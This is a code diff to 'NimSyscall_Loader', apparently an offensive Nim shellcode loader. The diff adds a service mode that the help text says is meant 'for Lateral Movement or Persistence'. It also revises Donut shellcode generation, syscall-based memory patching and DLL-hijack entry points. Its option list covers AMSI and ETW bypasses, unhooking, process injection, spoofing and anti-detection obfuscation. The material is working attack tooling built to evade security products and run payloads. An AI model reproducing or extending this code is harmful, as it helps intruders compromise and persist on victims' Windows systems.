@@ -64,7 +64,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.8
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --CallbackExecute --localCreateThread --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --remoteMapSection --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --sourceonly --service]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -92,9 +92,10 @@ Options:
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
   --verbose    Prints output to the console (for troubleshooting purposes)
   --psout    Powershell Output format, reflectively loading the packed binary
-    --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation
+    --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation.
     --pslyrics    Add Lyrics as comments to avoid some more detections
   --sourceonly    Dont compile but just create the source code and compile command
+  --service    Create a Service binary or DLL, which can be used for Lateral Movement or Persistence
 
 [Payload retrieval options]
 
@@ -122,7 +123,7 @@ Options:
   --sgn    Encode shellcode via SGN before encrypting it´
   --replace    Replace common nim IoC's in the loader like the string 'nim'
   --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
-  --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/) -> Prevent Loading works, but C# Loading fails for some reason
+  --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
   --sandbox value    Include Sandbox Checks of your choice into the loader:
                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                      DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
@@ -209,7 +210,8 @@ var
     cpl: bool = false
     replaceNimMain: bool = false
     big: bool
-    sourceonly: bool = false
+    sourceonly: bool = false#
+    service: bool = false
     remoteprocesses : seq[string]
     existingprocessInjection: bool = false
     targetdomain : string = ""
@@ -303,7 +305,6 @@ if args["--pslyrics"]:
 
 if args["--sourceonly"]:
     sourceonly = true
-
 
 if args["--arguments"]:
   let argsForPE = args["--arguments"]
@@ -574,6 +575,10 @@ if args["--wow64"]:
 if args["--verbose"]:
   verbose = true
 
+if args["--service"]:
+    service = true
+    verbose = false
+
 if args["--noDInvoke"]:
   noDInvoke = true
 
@@ -617,6 +622,9 @@ if ((csharp and shellcode) or (csharp and peload) or (csharp and peinject) or (p
 if (dllclone and dllProxy):
     echo "Error: You can only use one of --dllclone (Sideloading with Koppeling) or --dllProxy (Proxying through the legitimate DLL)!"
     quit(1)
+
+if (peload and embeddedArguments):
+    verbose = true # workaround, something in DInvoke+NoVerbose breaks the arguments
 
 if (peload or peinject):
     let stream = newFileStream(filename, mode = fmRead)
@@ -671,7 +679,9 @@ if (peinject):
     if (exist):
         when system.hostOS == "windows":
             if (embeddedArguments):
-                discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -p {arguments} -o tmpshellcode.bin --input:{filename}")
+                echo "Donut command: "
+                echo fmt"{packerPath}\donut\donut -b 1 -p ""{arguments}"" -o tmpshellcode.bin --input:{filename}"
+                discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -p ""{arguments}"" -o tmpshellcode.bin --input:{filename}")
             else:
                 discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -o tmpshellcode.bin --input:{filename}")
             if (sgn):
@@ -681,7 +691,14 @@ if (peinject):
                     discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                 sgn = false
         elif system.hostOS == "linux":
-            discard os.execShellCmd(fmt"donut --input:{filename} -b 1 -o tmpshellcode.bin")
+            if(embeddedArguments):
+                echo "Donut command: "
+                echo fmt"donut --input:{filename} -b 1 -p '{arguments}' -o tmpshellcode.bin"
+                discard os.execShellCmd(fmt"donut --input:{filename} -b 1 -p '{arguments}' -o tmpshellcode.bin")
+            else:
+                echo "Donut command: "
+                echo fmt"donut --input:{filename} -b 1 -o tmpshellcode.bin"
+                discard os.execShellCmd(fmt"donut --input:{filename} -b 1 -o tmpshellcode.bin")
             if (sgn):
                 if (compileX86):
                     discard os.execShellCmd(fmt"{packerPath}/sgn/sgn -c 3  -o tmpshellcode.bin tmpshellcode.bin")
@@ -810,15 +827,12 @@ var {randName}: string = obf("{randValues}")
 let PatchargsFuncs = fmt"""
     var arguments: string = "{arguments}"
     when defined(args):
-        proc patchMemory*(targetAddr: PVOID, data: openArray[byte]): void =
+        proc patchMemory(targetAddr: PVOID, data: openArray[byte]): void =
             var oldProtect: DWORD = 0
             var lpAddress = targetAddr
             var dwSize = cast[SIZE_T](len(data))
             var status: NTSTATUS = 0x00000000
-            when defined(DInvoke):
-                var hProcess = MyGetCurrentProcess()
-            else:
-                var hProcess = GetCurrentProcess()
+            var hProcess = -1
             when defined(Syswhispers):
                 status =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
                 when defined(verbose):
@@ -833,20 +847,17 @@ let PatchargsFuncs = fmt"""
                     if getSyscall(ntProtectTable):                
                         syscall = ntProtectTable.wSysCall
                     else:
-                        when defined(verbose):
-                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                 status =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
                 if (status != 0):
-                    when defined(verbose):
-                        echo obf("[-] Failed to change memory protections.")
-                        echo toHex(status)
+                    echo obf("[-] Failed to change memory protections.")
+                    echo toHex(status)
                 
             when defined(Hellsgate):
                 if getSyscall(ntWriteTable):
                     syscall = ntWriteTable.wSysCall
                 else:
-                    when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
             var scLength: SIZE_T = SIZE_T(len(data))
             var bytesWritten: SIZE_T
                 
@@ -854,16 +865,12 @@ let PatchargsFuncs = fmt"""
                 status = oqiazasusjk(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
             else:
                 status = NtWriteVirtualMemory(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
-                when defined(verbose):
-                    echo obf("NtWriteVirtualMemory: "),toHex(status)
+                echo obf("NtWriteVirtualMemory: "),toHex(status)
                 if (status != 0):
-                    when defined(verbose):
-                        echo obf("[-] Failed to write arguments.")
-                    when defined(verbose):
-                        echo toHex(status)
+                    echo obf("[-] Failed to write arguments.")
+                    echo toHex(status)
                 else:
-                    when defined(verbose):
-                        echo obf("[+] Arguments written successfully.")
+                    echo obf("[+] Arguments written successfully.")
             when defined(Syswhispers):
                 status = uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
             else:
@@ -871,11 +878,10 @@ let PatchargsFuncs = fmt"""
                     if getSyscall(ntProtectTable):                
                         syscall = ntProtectTable.wSysCall
                     else:
-                        when defined(verbose):
-                            echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                 success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
     when defined(args):
-        proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
+        proc patchArgFunctionMemory(funcAddr: pointer, pNewCommandLine: pointer): void =
             when defined x86:
                 var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
             else:
@@ -948,10 +954,14 @@ let LoadAssemblyStubArgs = """
     discard calcHard()
 
 when not defined(proxy):
-    discard main(nil)
+    when not defined(service):
+        when not defined(cloned):
+            discard main(nil)
 
 when defined(defaultMain):
-    discard main(nil)
+    when not defined(service):
+        when not defined(cloned):
+            discard main(nil)
 """
 
 let LoadAssemblyStubNoArgs = """
@@ -961,10 +971,14 @@ let LoadAssemblyStubNoArgs = """
     assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
 
 when not defined(proxy):
-    discard main(nil)
+    when not defined(service):
+        when not defined(cloned):
+            discard main(nil)
 
 when defined(defaultMain):
-    discard main(nil)
+    when not defined(service):
+        when not defined(cloned):
+            discard main(nil)
 """
 
 
@@ -1001,6 +1015,167 @@ let ShellcodeFromFileStub * = fmt"""
         except:
             when defined(verbose):
                 echo obf("[-] Failed to open file: ") & f
+
+"""
+
+let ServiceDllStub * = """
+
+const
+  SVCNAME* = obf("PackerService")
+
+var serviceStatus*: SERVICE_STATUS
+
+var serviceStatusHandle*: SERVICE_STATUS_HANDLE
+
+var stopEvent*: HANDLE
+
+proc UpdateServiceStatus*(currentState: DWORD): VOID =
+  serviceStatus.dwCurrentState = currentState
+  SetServiceStatus(serviceStatusHandle, addr(serviceStatus))
+
+proc ServiceHandler*(controlCode: DWORD; eventType: DWORD; eventData: LPVOID;
+                    context: LPVOID): DWORD =
+  case controlCode
+  of SERVICE_CONTROL_STOP:
+    serviceStatus.dwCurrentState = SERVICE_STOPPED
+    SetEvent(stopEvent)
+  of SERVICE_CONTROL_SHUTDOWN:
+    serviceStatus.dwCurrentState = SERVICE_STOPPED
+    SetEvent(stopEvent)
+  of SERVICE_CONTROL_PAUSE:
+    serviceStatus.dwCurrentState = SERVICE_PAUSED
+  of SERVICE_CONTROL_CONTINUE:
+    serviceStatus.dwCurrentState = SERVICE_RUNNING
+  of SERVICE_CONTROL_INTERROGATE:
+    discard
+  else:
+    discard
+  UpdateServiceStatus(SERVICE_RUNNING)
+  return NO_ERROR
+
+proc ExecuteServiceCode*(): VOID =
+  stopEvent = CreateEvent(nil, TRUE, FALSE, nil)
+  UpdateServiceStatus(SERVICE_RUNNING)
+  ##  #####################################
+  ##  your persistence code here
+  ##  #####################################
+  discard main(nil)
+  while (serviceStatus.dwCurrentState != SERVICE_STOP_PENDING):
+    WaitForSingleObject(stopEvent, INFINITE)
+    UpdateServiceStatus(SERVICE_STOPPED)
+    return
+
+proc ServiceMain*(dwArgc: DWORD, lpszArgv: ptr LPTSTR): VOID {.stdcall,exportc, dynlib.} =
+    NimMain() # otherwise garbage collector and other stuff won't have initialized.
+    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME,
+                                                     cast[LPHANDLER_FUNCTION](ServiceHandler))
+    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS
+    serviceStatus.dwServiceSpecificExitCode = 0
+    UpdateServiceStatus(SERVICE_START_PENDING)
+    ExecuteServiceCode()
+
+"""
+
+let ServiceStub * = """
+
+#
+#
+#               nimWindowsService
+#        (c) Copyright 2018 David Krause
+#
+#    See the file "LICENSE.txt", included in this
+#    distribution, for details about the copyright.
+#
+## the service code
+## a windows service needs to register its main function in the Service control manager
+## and also report its status!
+
+# https://docs.microsoft.com/en-us/windows/desktop/api/winsvc/nf-winsvc-controlservice
+
+type ServiceMain = proc(gSvcStatus: SERVICE_STATUS)
+
+var SERVICE_NAME =  "SERVICE_NAME2_BAA".LPTSTR
+var gSvcStatusHandle: SERVICE_STATUS_HANDLE
+var gSvcStatus: SERVICE_STATUS 
+
+proc reportSvcStatus*(dwCurrentState, dwWin32ExitCode, dwWaitHint: DWORD) =
+    var dwCheckPoint: DWORD = 1 # TODO what is this? 
+    gSvcStatus.dwCurrentState = dwCurrentState
+    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode
+    gSvcStatus.dwWaitHint = dwWaitHint
+    if dwCurrentState == SERVICE_START_PENDING:
+        gSvcStatus.dwControlsAccepted = 0
+    else:
+        gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP
+
+    if dwCurrentState == SERVICE_RUNNING or dwCurrentState == SERVICE_STOPPED:
+        gSvcStatus.dwCheckPoint = 0
+    else:
+        gSvcStatus.dwCheckPoint = dwCheckPoint
+        dwCheckPoint.inc()
+    
+    # Report the status of the service to the SCM.
+    echo "SetServiceStatus: " & $SetServiceStatus(gSvcStatusHandle, addr gSvcStatus)
+
+proc svcCtrlHandler(dwCtrl: DWORD) {.stdcall.} =
+    ## Handle the requested control code. 
+    case dwCtrl
+    of SERVICE_CONTROL_STOP:
+        # Signal the service to stop 
+        # TODO we must stop OUR code somehow!
+        reportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 10_000) # we think we can stop the service in 10 seconds
+    of SERVICE_CONTROL_INTERROGATE:
+        discard
+    else:
+        discard
+
+template wrapServiceMain*(mainProc: ServiceMain): LPSERVICE_MAIN_FUNCTION = 
+    ## wraps a nim proc in a LPSERVICE_MAIN_FUNCTION
+    proc serviceMainFunction(dwArgc: DWORD, lpszArgv: ptr LPTSTR) {.stdcall.} =
+        gSvcStatusHandle = RegisterServiceCtrlHandler(
+            SERVICE_NAME,
+            svcCtrlHandler
+        )
+        gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS
+        gSvcStatus.dwServiceSpecificExitCode = 0
+        reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)   
+        mainProc(gSvcStatus) # call the wrapped proc
+        reportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0) # we have to report back when we stopped!
+    serviceMainFunction
+
+
+when isMainModule:
+    import times, os
+    proc serviceMain(gSvcStatus: SERVICE_STATUS) =
+        ## a service main
+        ## use gScvStatus to check if we should stop periodically!
+        #reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
+        discard main(nil)
+        #var onlyOnce: bool = true
+        #sleep(5000)
+        reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
+        #sleep(5000)
+        while gSvcStatus.dwCurrentState != SERVICE_STOP_PENDING:
+            sleep(1000)
+        #[    reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
+            if(onlyOnce):
+                onlyOnce = false
+                discard main(nil)
+        ]#
+        #reportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0) # we have to report back when we stopped!
+
+    var wrapped = wrapServiceMain(serviceMain)
+    var dispatchTable = [
+        # SERVICE_TABLE_ENTRY(lpServiceName: SERVICE_NAME, lpServiceProc: SvcMain),
+        SERVICE_TABLE_ENTRY(lpServiceName: SERVICE_NAME, lpServiceProc: wrapped),
+        SERVICE_TABLE_ENTRY(lpServiceName: nil, lpServiceProc: nil) # last entry must be nil
+    ]
+
+    echo StartServiceCtrlDispatcher( (addr dispatchTable[0]).LPSERVICE_TABLE_ENTRY)
+    while gSvcStatus.dwCurrentState == SERVICE_RUNNING:
+        reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
+        sleep(1000)
+
 
 """
 
@@ -1172,7 +1347,6 @@ import ptr_math
 #from winim import winstr,winimbase,windef
 
 when defined(csharp):
-    import winim/clr
     from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
     from os import paramCount,paramStr
 
@@ -1203,7 +1377,8 @@ when defined(COMVARETW):
     from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
 
 when not defined(proxy):
-    import strenc
+    when defined(notcloned):
+        import strenc
 when defined(Fluctuate):
     import Fluctuation
 
@@ -1536,11 +1711,13 @@ when defined(notcloned):
 let DLLHijackStub = """
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
-  when defined(notcloned):
-    NimMain()
+  NimMain()
   
   if fdwReason == DLL_PROCESS_ATTACH:
     NimMain()
+    when defined(cloned):
+        var threadHandle = CreateThread(NULL, 0, main, NULL, 0, NULL)
+        CloseHandle(threadHandle)
   if fdwReason == DLL_THREAD_ATTACH:
     NimMain()
   #if fdwReason == DLL_PROCESS_ATTACH:
@@ -1756,8 +1933,7 @@ if (not noDInvoke):
 
 if(pump):
     # makes no sense to import strenc when strings should be visible in the binary.
-    stub =  stub.replace("    import strenc", "")
-    stub = stub.replace("when not defined(proxy):", "")
+    stub =  stub.replace("    import strenc", "    from winim import MODULEENTRY32A")
     for m in pumpargs:
         if(m == "words"):
             echo "[*] Adding words"
@@ -2072,9 +2248,14 @@ if(dll_out or cpl):
         stub.add(DllCustomExportStub)
         stub = stub.replace("FUNC_EXPORT", f)
 
+if(service):
+    if(dll_out):
+        stub.add(ServiceDllStub)
+    else:
+        stub.add(ServiceStub)
+
 if (debugMode):
-    stub = stub.replace("import strenc", "")
-    stub = stub.replace("when not defined(proxy):", "")
+    stub = stub.replace("import strenc", "from winim import MODULEENTRY32A")
 
 writeFile("Loader.nim", stub)
 echo "Written Loader.nim -> \n\n"
@@ -2151,6 +2332,9 @@ if (dllProxy):
     basicCompileFlags.add("--mm:orc --threads:on ")
     basicCompileFlags.add("-d:proxy ")
 
+if(service):
+    basicCompileFlags.add("-d:service ")
+
 if(dllProxy):
     when system.hostOS == "windows":
         basicCompileFlags.add(fmt" --passl:{packerpath}\\build\\{randValue}.def ")
@@ -2180,6 +2364,9 @@ if(remoteinject):
 
 if(COMVARETW):
     basicCompileFlags.add("-d:COMVARETW ")
+
+if(service):
+    basicCompileFlags.add("--mm:none ")
 
 if (noNimMain):
     when system.hostOS == "windows":
@@ -2212,8 +2399,12 @@ if (dllClone == false):
 if embeddedArguments:
     basicCompileFlags.add("-d:args ")
 
-if ((dllProxy == false) and (dllClone == false)):
+if ((dllProxy == false) #[and (dllClone == false)]#):
     basicCompileFlags.add("-d:defaultMain ")
+
+if(dllClone):
+    basicCompileFlags.add("--mm:none ")
+    basicCompileFlags.add("-d:cloned ")
 
 if (big):
     basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
@@ -2252,10 +2443,10 @@ if localCreateThread:
     basicCompileFlags.add("-d:LocalCreateThread ")
 
 if (dll_out or cpl):
-    if (processname == ""):
-        basicCompileFlags.add("--app=lib --nomain -d:lib_only ")
-    else:
-        basicCompileFlags.add("--app=lib -d:lib_only ")
+    #if (processname == ""): # Why did I do that? It make no sense.
+    #    basicCompileFlags.add("--app=lib --nomain -d:lib_only ")
+    #else:
+    basicCompileFlags.add("--app=lib -d:lib_only --nomain ")
 else:
     if(hide):
         basicCompileFlags.add("--app=gui ")
@@ -2383,6 +2574,12 @@ proc WritePS1() =
         var words: seq[string] = @["VAR", "FUN", "CONST", "ERROR", "LYRICS"]
         var wordlength: int = len(words) - 1
         var maxWords: int = 999
+        if(psobfs):
+            words[1] = "XXXXXX" # we don't want to replace any names, as that breaks functionality.
+            words[2] = "XXXXXX"
+            words[3] = "XXXXXX"
+            words[0] = "XXXXXX"
+            
         for i in 0..wordlength:
             if (words[i] == "VAR"):
                 maxWords = 380
